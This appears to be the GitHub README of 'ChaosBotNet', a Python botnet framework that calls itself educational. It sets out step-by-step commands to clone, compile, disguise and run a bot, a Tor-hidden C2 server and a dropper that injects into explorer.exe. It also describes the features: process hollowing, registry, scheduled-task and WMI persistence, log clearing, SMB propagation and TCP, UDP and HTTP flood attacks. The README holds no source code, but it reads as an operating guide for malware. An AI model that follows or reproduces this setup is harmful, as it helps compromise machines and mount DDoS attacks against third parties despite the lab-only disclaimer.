# ChaosBotNet - Educational Botnet Framework

**⚠️ Disclaimer:** This project is for **educational purposes only**. It demonstrates botnet mechanics for cybersecurity research and penetration testing training. Unauthorized use against real systems is illegal and unethical. Use responsibly in controlled, authorized environments.

## Overview

ChaosBotNet is a Python-based framework showcasing how botnets—networks of compromised devices—operate. It includes three components:

1. **`bot.py`**: The client-side bot that infects devices, communicates with a command-and-control (C2) server, and spreads to other systems.
2. **`c2.py`**: The C2 server that manages bots, issues commands, and launches network attacks like DDoS.
3. **`drop.py`**: A dropper that delivers the bot payload to a target system.

This project simulates real-world botnet techniques like encryption, stealth, persistence, and propagation, making it a valuable tool for learning cybersecurity concepts such as malware analysis, network defense, and ethical hacking.

## Purpose

- Teach beginners how botnets work, step-by-step.
- Provide a hands-on example for cybersecurity students and professionals.
- Highlight detection and mitigation strategies for defenders.

## Features

- **Stealth:** Uses process hollowing, fileless execution, and log clearing to hide from detection.
- **Persistence:** Ensures bots restart using registry keys, scheduled tasks, and WMI triggers.
- **Communication:** Combines DNS tunneling and HTTPS for C2 connectivity.
- **Propagation:** Spreads via networks (SMB) and removable drives (ADS).
- **Attacks:** Launches TCP, UDP, and HTTP floods for DDoS simulations.
- **Anonymity:** Supports proxies and Tor for C2 operations.

## Prerequisites

- **Python 3.8+**: Install with `pip` for dependencies.
- **Windows**: Designed for Windows (uses `winreg`, `ctypes`, etc.), but adaptable.
- **Libraries**: Install via `pip install -r requirements.txt`:
  - `requests`, `pycryptodome`, `wmi`, `pywin32`, `torpy`, `aiohttp`, `scapy`

## Setup

This section guides you through setting up the ChaosBotNet framework in a controlled, simulated lab environment (e.g., VirtualBox with host-only networking). Ensure all actions remain ethical and confined to your test network to avoid unintended consequences.

### Prerequisites

- **Operating System**: Windows (for bot and dropper compatibility) and optionally Linux for the C2 server.
- **Python**: Version 3.8+ installed.
- **Virtual Environment**: Recommended for dependency isolation.
- **Lab Network**: Isolated network (e.g., 192.168.x.x subnet) to prevent leakage.

### Steps

#### 1. Clone the Repository
```bash
git clone https://github.com/pattty847/ChaosBotNet.git
cd ChaosBotNet
```

#### 2. Install Dependencies
```bash
pip install -r requirements.txt
```

Additional tools:

- **UPX**: For executable compression (used in `comp.py`). Download from [UPX](https://upx.github.io/) and add to your PATH.
- **PyInstaller**: For building executables.
```bash
pip install pyinstaller
```
- **PyWin32**: For Windows event log clearing.
```bash
pip install pywin32
```

#### 3. Build the Executable
Use the `comp.py` script to compile the bot into a standalone executable with obfuscation and spoofing. This step enhances stealth by mimicking a legitimate Windows binary.
```bash
python comp.py
```

- **Output**: The executable is generated in the `dist/` directory (e.g., `dist/ChaosBot.exe`).
- **Customization**: Edit `comp.py` to change `output_name` or `icon_path` (e.g., use a custom `svchost.ico` for masquerading).

#### 4. Run Components in a Lab Environment
Deploy the botnet components in your isolated lab environment. Use separate terminals or VMs for each component:

##### Start the C2 Server
```bash
python c2.py
```
- **Notes**: Ensure Tor is installed (`pip install torpy`) and running. The onion address will be printed on startup.

##### Deploy the Dropper
```bash
python drop.py
```
- **Notes**: This downloads the payload and injects it into a process (e.g., `explorer.exe`). Run on a Windows VM.

##### Launch the Bot
Run the bot directly or deploy the compiled executable:
```bash
python bot.py
```
**OR**
```bash
dist/ChaosBot.exe
```

- **Notes**: The bot connects to the C2 server and begins executing tasks. Use the executable for stealth testing.

### Verification

- Check C2 logs for bot check-ins (e.g., `Bot Bot-1 checked in`).
- Monitor the bot’s encrypted log file (`log.enc`) in the random APPDATA folder for errors.
- Simulate network traffic to confirm flooding or propagation (e.g., Wireshark on the lab network).

### Tips for Success

- **Isolation**: Configure your VM network as host-only to prevent accidental external connections.
- **Customization**: Adjust `C2_DNS` in `bot.py` and `TARGET_SERVER` in `c2.py` to point to your lab IP addresses.
- **Debugging**: Run with `PYTHONPATH=.` if module import errors occur.

## Usage

- **Testing**: Use a virtual network to simulate infection and attacks.
- **Learning**: Read the function documentation below to understand each part.
- **Customization**: Modify `C2_DNS`, `PS_URL`, or attack parameters in the code.

## ⚠️ Warning

This is a proof-of-concept. Running it outside a controlled lab may violate laws like the **Computer Fraud and Abuse Act (CFAA)**. Obtain **explicit permission** before testing on any system.

## Contributing

Fork this repo, submit pull requests, or open issues with ideas. Focus on educational enhancements—e.g., better comments, new evasion techniques, or detection tips.

## License

**MIT License** — free to use for educational purposes, with no warranty.

## Documentation for Very Important Functions

### From `bot.py`

#### `real_encrypt(data)`
- **Purpose**: Encrypts data using AES-256 to secure communication.
- **Example**: `data = "attack now"` → Encrypted output (base64 encoded).

#### `set_persistence()`
- **Purpose**: Ensures the bot remains active after reboots.
- **Methods**: Adds the bot to the registry, scheduled tasks, and WMI triggers.

#### `hybrid_tunnel()`
- **Purpose**: Uses DNS and HTTPS for stealthy C2 communication.

#### `inject_hollow(target_path=None)`
- **Purpose**: Injects bot code into a running process to evade detection.

### From `c2.py`

#### `network_chaos_worker()`
- **Purpose**: Launches TCP, UDP, or HTTP-based flood attacks.

#### `ChaosC2Server.handle_client(client, addr)`
- **Purpose**: Handles bot check-ins and task assignments over Tor.

### From `drop.py`

#### `inject_into_process()`
- **Purpose**: Plants the bot into a running process (`explorer.exe`) to start it quietly.

---

This formatted version ensures readability, clear structure, and proper Markdown syntax for easy viewing on GitHub or other platforms.
